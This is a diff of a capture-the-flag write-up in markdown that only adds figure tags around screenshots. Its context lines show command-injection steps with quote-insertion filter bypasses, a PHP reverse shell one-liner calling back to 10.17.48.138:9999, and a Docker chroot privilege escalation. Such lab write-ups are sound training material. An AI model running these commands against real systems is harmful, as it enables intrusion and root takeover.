@@ -112,7 +112,9 @@ Finished
 ```
 The `/secret` page looks interesting, let's visit it through our browser.
 
+<figure style={{ textAlign: 'center' }}>
 ![2](https://github.com/Knign/Write-ups/assets/110326359/c8e6dd1c-7b17-4316-997d-9050bab2259c)
+</figure>
 
 As we can see this is the page where we can input commands.
 
@@ -121,7 +123,9 @@ Let's pass the following command:
 id
 ```
 
+<figure style={{ textAlign: 'center' }}>
 ![3](https://github.com/Knign/Write-ups/assets/110326359/dafa46e1-192b-456e-9288-88e4a4d70f69)
+</figure>
 
 Looks like it worked.
 
@@ -130,7 +134,9 @@ Let's list out the content of the directory:
 ls -la
 ```
 
+<figure style={{ textAlign: 'center' }}>
 ![4](https://github.com/Knign/Write-ups/assets/110326359/a2c5b764-7434-4989-855b-cb7f739f5b39)
+</figure>
 
 Ah so our command probably matched some black-list string and was filtered.
 
@@ -139,7 +145,9 @@ We can try to bypass the filter using single quotes:
 l's' -la
 ```
 
+<figure style={{ textAlign: 'center' }}>
 ![5](https://github.com/Knign/Write-ups/assets/110326359/46fad622-1844-4848-995f-67d0ab7c1045)
+</figure>
 
 There is an `index.php` file. If we can manage to read it, we might be able to see how the black-list is implemented.
 
@@ -148,20 +156,26 @@ Let's `cat` it out.
 cat index.php
 ```
 
+<figure style={{ textAlign: 'center' }}>
 ![6](https://github.com/Knign/Write-ups/assets/110326359/16cc8de2-4115-4bde-8b9b-7bc5c776de14)
+</figure>
 
 We can do the same bypass as before with single quotes:
 ```
 c'a't index.php
 ```
 
+<figure style={{ textAlign: 'center' }}>
 ![7](https://github.com/Knign/Write-ups/assets/110326359/6bdff5ec-45e6-4315-8db3-927d9d78e782)
+</figure>
 
 The layout looks different. That is because the `ìndex.php` file was read and executed.
 
 We can now check the source code using `CTRL+U`.
 
+<figure style={{ textAlign: 'center' }}>
 ![8](https://github.com/Knign/Write-ups/assets/110326359/3f0ab7b7-0c6d-4b03-9da9-c6cda4600539)
+</figure>
 
 Now we know what pattern are being filterd.
 ```php
@@ -177,7 +191,9 @@ Now we have to provide a PHP reverse shell:
 p'h'p -r '$sock=fsockopen("10.17.48.138",9999);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
 
+<figure style={{ textAlign: 'center' }}>
 ![9](https://github.com/Knign/Write-ups/assets/110326359/147c2bbe-95d2-4ffb-a50c-89bcb8aeea49)
+</figure>
 
 Let's check back on our listener.
 ```
@@ -436,7 +452,9 @@ So the `anurodh` user is part of the `docker` group.
 
 We can find an exploit for Docker on GTFOBins.
 
+<figure style={{ textAlign: 'center' }}>
 ![10](https://github.com/Knign/Write-ups/assets/110326359/c8d985c8-c12e-40e9-b33c-944de4720325)
+</figure>
 
 ```
 docker run -v /:/mnt --rm -it alpine chroot /mnt sh
